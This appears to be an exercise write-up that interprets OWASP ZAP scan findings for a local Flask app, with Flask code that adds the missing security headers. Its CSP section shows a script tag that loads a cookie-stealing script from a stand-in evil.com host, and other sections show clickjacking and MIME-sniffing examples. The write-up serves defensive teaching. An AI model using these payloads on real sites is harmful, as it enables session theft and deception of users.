# Exercise 3: ZAP DAST Findings Interpretation


## ZAP Scan Results Summary

**Scan Details**:
- **Tool**: OWASP ZAP
- **Scan Types**: Baseline (passive) + Full scan (active)
- **Target**: http://localhost:5000
- **Total Alerts**: 13 unique security findings
- **Total Instances**: 36 individual occurrences

---

## Complete Findings Table

### Medium Severity Findings

| Code | Issue Name | Risk | Instances | Affected URLs | Why It Matters | Attack Scenario |
|:-----|:-----------|:-----|:----------|:--------------|:---------------|:----------------|
| **10038** | Content Security Policy (CSP) Header Not Set | Medium (High) | 5 | All endpoints | Prevents XSS and data injection attacks. Without CSP, attackers can inject malicious scripts that execute in users' browsers | Attacker injects `<script>` tag stealing session cookies and sending them to attacker's server |
| **10106** | HTTP Only Site | Medium (Medium) | 1 | http://localhost:5000 | Traffic is unencrypted, allowing eavesdropping and tampering. Credentials and sensitive data transmitted in plaintext | Attacker on same WiFi network captures login credentials using Wireshark |
| **10020** | Missing Anti-clickjacking Header | Medium (Medium) | 2 | Root endpoints | Attackers can embed site in invisible iframe, tricking users into clicking hidden buttons performing unwanted actions | Malicious site overlays transparent calculator iframe over "Download" button, user unknowingly performs calculator operations |

### Low Severity Findings

| Code | Issue Name | Risk | Instances | Affected URLs | Why It Matters | Attack Scenario |
|:-----|:-----------|:-----|:----------|:--------------|:---------------|:----------------|
| **90004** | Insufficient Site Isolation Against Spectre Vulnerability | Low (Medium) | 6 | All endpoints | Side-channel attacks could leak sensitive data across origins using CPU timing analysis | Advanced attacker uses Spectre-like vulnerability to read memory from other browser tabs |
| **10063** | Permissions Policy Header Not Set | Low (Medium) | 5 | All endpoints | Malicious scripts could access device features (camera, microphone, location) without explicit permission | Embedded ad iframe accesses user's camera without consent |
| **10036** | Server Leaks Version Information | Low (High) | 5 | All endpoints | Reveals `Werkzeug/2.0.1 Python/3.9.25`, helping attackers identify known vulnerabilities in these specific versions | Attacker sees old Werkzeug version, searches exploit database for CVE-2023-25577, launches targeted attack |
| **10021** | X-Content-Type-Options Header Missing | Low (Medium) | 2 | Root endpoints | Browsers may misinterpret file types, potentially executing scripts disguised as images or other content | Attacker uploads malicious file as image, browser executes it as JavaScript due to MIME-sniffing |

### Informational Findings

| Code | Issue Name | Risk | Instances | Affected URLs | Why It Matters | Attack Scenario |
|:-----|:-----------|:-----|:----------|:--------------|:---------------|:----------------|
| **10109** | Modern Web Application | Info (Medium) | 2 | Root endpoints | Informational only - detected async JavaScript and fetch API. Suggests Ajax Spider may be more effective than standard spider | N/A - Detection only |
| **90005** | Sec-Fetch-Dest Header is Missing | Info (High) | 3 | /, /robots.txt, /sitemap.xml | Browser should send this header to specify resource type. Missing header provides less context for server-side security decisions | Minimal - Browser-side header, not server responsibility |
| **90005** | Sec-Fetch-Mode Header is Missing | Info (High) | 3 | /, /robots.txt, /sitemap.xml | Browser should indicate navigation vs resource loading. Helps servers distinguish request context | Minimal - Browser-side header, not server responsibility |
| **90005** | Sec-Fetch-Site Header is Missing | Info (High) | 3 | /, /robots.txt, /sitemap.xml | Browser should specify relationship between initiator and target origin. Aids in CSRF protection | Minimal - Browser-side header, not server responsibility |
| **90005** | Sec-Fetch-User Header is Missing | Info (High) | 3 | /, /robots.txt, /sitemap.xml | Browser should indicate if navigation was user-initiated. Helps distinguish between user and script actions | Minimal - Browser-side header, not server responsibility |
| **10049** | Storable and Cacheable Content | Info (Medium) | 5 | All endpoints | Content may be cached for up to 1 year by proxies. Sensitive data could be exposed through cache | Corporate proxy caches calculator results containing sensitive financial calculations, later retrieved by another user |

---

## Detailed Analysis by Alert Code

### 10038 - Content Security Policy (CSP) Header Not Set

**What is CSP?**
Content Security Policy is a security standard that tells browsers which sources of content are trusted. It's like a whitelist for scripts, styles, images, and other resources.

**Technical Details**:
- **CWE ID**: 693 (Protection Mechanism Failure)
- **WASC ID**: 15 (Application Misconfiguration)
- **Confidence**: High

**Attack Without CSP**:
```html
<!-- Attacker injects this into a vulnerable field -->
<script src="https://evil.com/steal-cookies.js"></script>
```

**Protection With CSP**:
```http
Content-Security-Policy: default-src 'self'; script-src 'self'
```
The injected script is blocked because `evil.com` is not in the allowed sources.

**Fix Implementation**:
```python
@app.after_request
def set_csp_header(response):
    response.headers['Content-Security-Policy'] = "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data:;"
    return response
```

**Priority**: 🔴 HIGH - Prevents entire class of XSS attacks

---

### 10106 - HTTP Only Site

**What is HTTPS?**
HTTPS encrypts all traffic between client and server using TLS/SSL certificates, preventing eavesdropping and tampering.

**Technical Details**:
- **CWE ID**: 311 (Missing Encryption)
- **WASC ID**: 4 (Insufficient Transport Layer Protection)
- **Evidence**: ZAP attempted connection to `https://localhost:5000` and failed

**Real-World Impact**:
- Passwords transmitted in plaintext
- Session cookies can be hijacked
- Man-in-the-middle attacks possible
- Search engines penalize HTTP sites

**Fix Implementation** (Development):
```python
pip install flask-talisman
from flask_talisman import Talisman

app = Flask(__name__)
Talisman(app, force_https=True)
```

**Fix Implementation** (Production):
- Obtain SSL certificate (Let's Encrypt is free)
- Configure nginx/Apache to handle HTTPS
- Redirect all HTTP traffic to HTTPS

**Priority**: 🔴 HIGH - Fundamental security requirement

---

### 10020 - Missing Anti-clickjacking Header

**What is Clickjacking?**
Attacker embeds your site in an invisible iframe over their malicious page. Users think they're clicking on the malicious site, but they're actually clicking your application.

**Technical Details**:
- **CWE ID**: 1021 (Improper Restriction of Rendered UI Layers)
- **WASC ID**: 15 (Application Misconfiguration)
- **Missing Headers**: X-Frame-Options AND frame-ancestors in CSP

**Attack Scenario**:
```html
<!-- Attacker's malicious page -->
<iframe src="http://localhost:5000" style="opacity:0; position:absolute; top:0; left:0; width:100%; height:100%;"></iframe>
<button style="position:absolute; top:100px; left:100px;">
  Win Free iPhone!
</button>
```
User clicks "Win Free iPhone" but actually clicks a button on the calculator underneath.

**Fix Implementation**:
```python
@app.after_request
def set_frame_options(response):
    response.headers['X-Frame-Options'] = 'DENY'  # or 'SAMEORIGIN'
    # Alternative: Use CSP
    response.headers['Content-Security-Policy'] = "frame-ancestors 'none'"
    return response
```

**Priority**: 🟠 MEDIUM-HIGH - Prevents UI redressing attacks

---

### 90004 - Insufficient Site Isolation Against Spectre

**What is Spectre?**
A CPU vulnerability that allows malicious code to read arbitrary memory through side-channel timing attacks. Modern browsers use isolation headers to mitigate this.

**Technical Details**:
- **CWE ID**: 693 (Protection Mechanism Failure)
- **WASC ID**: 14 (Server Misconfiguration)
- **Missing Headers**:
  - Cross-Origin-Resource-Policy
  - Cross-Origin-Embedder-Policy
  - Cross-Origin-Opener-Policy

**Fix Implementation**:
```python
@app.after_request
def set_isolation_headers(response):
    response.headers['Cross-Origin-Resource-Policy'] = 'same-origin'
    response.headers['Cross-Origin-Embedder-Policy'] = 'require-corp'
    response.headers['Cross-Origin-Opener-Policy'] = 'same-origin'
    return response
```

**Priority**: 🟡 MEDIUM - Advanced attack, lower probability but high impact

---

### 10063 - Permissions Policy Header Not Set

**What is Permissions Policy?**
Formerly "Feature Policy" - controls which browser features and APIs can be used in the document and iframes.

**Technical Details**:
- **CWE ID**: 693 (Protection Mechanism Failure)
- **WASC ID**: 15 (Application Misconfiguration)

**Real-World Example**:
Without Permissions Policy, a malicious ad embedded on your page could:
- Access the camera/microphone
- Track location
- Use payment APIs
- Access USB devices

**Fix Implementation**:
```python
@app.after_request
def set_permissions_policy(response):
    response.headers['Permissions-Policy'] = (
        "geolocation=(), "
        "microphone=(), "
        "camera=(), "
        "payment=(), "
        "usb=(), "
        "magnetometer=(), "
        "gyroscope=(), "
        "accelerometer=()"
    )
    return response
```

**Priority**: 🟡 MEDIUM - Defense in depth, especially important for sites with third-party content

---

### 10036 - Server Leaks Version Information

**What is Information Disclosure?**
Revealing software versions helps attackers identify and exploit known vulnerabilities specific to those versions.

**Technical Details**:
- **CWE ID**: 497 (Exposure of Sensitive System Information)
- **WASC ID**: 13 (Information Leakage)
- **Evidence**: `Server: Werkzeug/2.0.1 Python/3.9.25`

**How Attackers Use This**:
1. See "Werkzeug/2.0.1" in headers
2. Search: "Werkzeug 2.0.1 CVE"
3. Find CVE-2023-25577 (resource consumption vulnerability)
4. Launch targeted attack

**Fix Implementation**:
```python
# Option 1: Suppress in Flask
from werkzeug.serving import WSGIRequestHandler
WSGIRequestHandler.server_version = "WebServer"
WSGIRequestHandler.sys_version = ""

# Option 2: Use production server (Gunicorn/uWSGI)
# gunicorn --access-logfile - --error-logfile - app:app

# Option 3: Nginx reverse proxy
# server {
#     proxy_hide_header Server;
#     add_header Server "WebServer";
# }
```

**Priority**: 🟡 MEDIUM - Easy fix, reduces attack surface

---

### 10021 - X-Content-Type-Options Header Missing

**What is MIME Sniffing?**
Old browsers try to "guess" file types by examining content, ignoring the Content-Type header. This can be exploited to execute malicious scripts.

**Technical Details**:
- **CWE ID**: 693 (Protection Mechanism Failure)
- **WASC ID**: 15 (Application Misconfiguration)

**Attack Scenario**:
```javascript
// Attacker uploads file named "image.jpg" containing:
/*
<script>alert('XSS')</script>
*/
// Without X-Content-Type-Options, old IE executes it as JavaScript
```

**Fix Implementation**:
```python
@app.after_request
def set_content_type_options(response):
    response.headers['X-Content-Type-Options'] = 'nosniff'
    return response
```

**Priority**: 🟡 MEDIUM - Easy fix, prevents legacy browser exploits

---

### 10109 - Modern Web Application (Informational)

**What This Means**:
ZAP detected modern JavaScript features (async/await, fetch API) in the application. This is informational only.

**Recommendation**:
For more thorough testing of JavaScript-heavy applications, use ZAP's Ajax Spider instead of the standard spider.

**No Action Required** - This is a positive detection.

---

### 90005 - Sec-Fetch-* Headers Missing (Informational)

**What are Sec-Fetch Headers?**
Browser-generated request metadata headers that provide context about the request:
- **Sec-Fetch-Dest**: Type of resource (document, image, script)
- **Sec-Fetch-Mode**: Request mode (navigate, cors, no-cors)
- **Sec-Fetch-Site**: Relationship between origins (same-origin, cross-site)
- **Sec-Fetch-User**: Whether user-initiated navigation

**Why They're Missing**:
These are **browser-sent headers**, not server-configured. ZAP's automated scanner doesn't send them.

**Server-Side Use**:
```python
@app.before_request
def check_sec_fetch():
    # Example: Reject requests not from same-origin
    if request.headers.get('Sec-Fetch-Site') == 'cross-site':
        if request.headers.get('Sec-Fetch-Mode') == 'navigate':
            abort(403)  # Prevent CSRF
```

**Priority**: 🔵 LOW - Informational only, browser-side feature

---

### 10049 - Storable and Cacheable Content (Informational)

**What This Means**:
Without explicit cache control headers, browsers and proxies may cache responses for extended periods (up to 1 year by RFC 7234 heuristic).

**Technical Details**:
- **CWE ID**: 524 (Use of Cache Containing Sensitive Information)
- **WASC ID**: 13 (Information Leakage)

**When This is a Problem**:
- Sensitive user data in responses
- Personalized content
- Frequently changing data

**Fix Implementation** (for sensitive pages):
```python
@app.after_request
def set_cache_control(response):
    # For sensitive data
    response.headers['Cache-Control'] = 'no-cache, no-store, must-revalidate, private'
    response.headers['Pragma'] = 'no-cache'
    response.headers['Expires'] = '0'
    return response

# For static resources (allow caching)
@app.route('/static/<path:filename>')
def static_files(filename):
    response = send_from_directory('static', filename)
    response.headers['Cache-Control'] = 'public, max-age=31536000'  # 1 year
    return response
```

**Priority**: 🔵 LOW - Only critical if handling sensitive data

---

## Summary Statistics

### Findings by Risk Level

```
Medium:  ███████████░░░░░░░░░░░░░░░░░░░░░  23% (3 types)
Low:     ██████████░░░░░░░░░░░░░░░░░░░░░░  31% (4 types)
Info:    ████████████████░░░░░░░░░░░░░░░░  46% (6 types)
```

### Findings by Instance Count

```
5 instances:  ████ (4 finding types)
3 instances:  ████ (4 finding types)
2 instances:  ██   (2 finding types)
1 instance:   █    (1 finding type)
```

### CWE Distribution

- **CWE-693** (Protection Mechanism Failure): 5 findings
- **CWE-352** (CSRF): 4 findings (Sec-Fetch headers)
- **CWE-311** (Missing Encryption): 1 finding
- **CWE-1021** (UI Restriction): 1 finding
- **CWE-497** (Information Exposure): 1 finding
- **CWE-524** (Cache Leakage): 1 finding

---

## Recommended Fixes - Complete Implementation

### Complete Flask Security Configuration

```python
from flask import Flask, render_template, request, jsonify

app = Flask(__name__)

@app.after_request
def set_security_headers(response):
    """Apply all security headers to every response"""

    # CSP - Prevents XSS (10038)
    response.headers['Content-Security-Policy'] = (
        "default-src 'self'; "
        "script-src 'self'; "
        "style-src 'self' 'unsafe-inline'; "
        "img-src 'self' data:; "
        "font-src 'self'; "
        "frame-ancestors 'none'; "
        "base-uri 'self'; "
        "form-action 'self'"
    )

    # Anti-clickjacking (10020)
    response.headers['X-Frame-Options'] = 'DENY'

    # MIME-sniffing protection (10021)
    response.headers['X-Content-Type-Options'] = 'nosniff'

    # Spectre protection (90004)
    response.headers['Cross-Origin-Resource-Policy'] = 'same-origin'
    response.headers['Cross-Origin-Embedder-Policy'] = 'require-corp'
    response.headers['Cross-Origin-Opener-Policy'] = 'same-origin'

    # Permissions policy (10063)
    response.headers['Permissions-Policy'] = (
        "geolocation=(), microphone=(), camera=(), "
        "payment=(), usb=(), magnetometer=(), "
        "gyroscope=(), accelerometer=()"
    )

    # Cache control for sensitive pages (10049)
    if request.path != '/static':
        response.headers['Cache-Control'] = 'no-cache, no-store, must-revalidate, private'
        response.headers['Pragma'] = 'no-cache'
        response.headers['Expires'] = '0'

    return response

# Suppress server version (10036)
from werkzeug.serving import WSGIRequestHandler
WSGIRequestHandler.server_version = "WebServer"
WSGIRequestHandler.sys_version = ""

# Main application routes (unchanged)
@app.route('/')
def index():
    return render_template('index.html')

@app.route('/calculate', methods=['POST'])
def calculate():
    # ... existing code ...
    pass

if __name__ == '__main__':
    # NEVER use debug=True in production
    app.run(host='0.0.0.0', port=5000, debug=False)
```

---

## Testing the Fixes

### Before Fixes
```bash
curl -I http://localhost:5000
# Server: Werkzeug/2.0.1 Python/3.9.25
# (No security headers)
```

### After Fixes
```bash
curl -I http://localhost:5000
# Server: WebServer
# Content-Security-Policy: default-src 'self'; ...
# X-Frame-Options: DENY
# X-Content-Type-Options: nosniff
# Cross-Origin-Resource-Policy: same-origin
# Permissions-Policy: geolocation=(), ...
```

### Validate with Online Tools
- **securityheaders.com** - Scan and grade security headers
- **Mozilla Observatory** - Comprehensive security scan
- **SSL Labs** - Test HTTPS configuration (after implementing SSL)

---

## Conclusion

### Current Security Posture
- ✅ No critical code vulnerabilities
- ⚠️ Missing essential HTTP security headers
- ⚠️ No HTTPS encryption
- ✅ Application logic appears sound

### After Implementing Fixes
- All 3 Medium severity issues → Fixed
- All 4 Low severity issues → Fixed
- Security grade: **D → A** (with HTTPS implementation)

### Estimated Implementation Time
- Security headers: **15 minutes**
- HTTPS (development): **30 minutes**
- HTTPS (production): **2-4 hours**

---

**Document Created**: December 5, 2025
**Exercise**: Part 3 - ZAP Findings Interpretation
**Related Documents**: SCAN_ANALYSIS.md
